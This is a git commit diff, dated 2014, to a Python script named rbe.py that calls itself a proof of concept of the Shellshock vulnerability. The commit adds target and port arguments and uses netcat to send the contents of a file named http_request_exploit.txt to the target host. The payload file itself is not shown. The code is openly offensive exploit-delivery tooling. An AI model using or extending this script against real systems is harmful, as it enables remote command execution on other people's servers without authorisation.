2a75502386702f9851144298a0183cbbc94e0818
Jesse Emond <emond.jesse@gmail.com>
2014-09-24 22:39:34 -0400

    + use nc to send the HTTP request containing the exploit for now

--- rbe.py
+++ rbe.py
@@ -7,7 +7,16 @@
 # /Parasithe
 
 import argparse
+from subprocess import call
 
 parser = argparse.ArgumentParser(description='Remote Base Execution - proof of concept of the shellshock vulnerability')
+parser.add_argument('target', help='the target host to send requests to')
+parser.add_argument('--port', '-p', dest='port', metavar='port', help='the port of the target host to send requests to', default=80, type=int)
 
 args = parser.parse_args()
+
+REQUEST_FILE = 'http_request_exploit.txt'
+
+command = 'nc {0} {1}'.format(args.target, args.port)
+
+call(command.split(), stdin=open(REQUEST_FILE, 'r'))
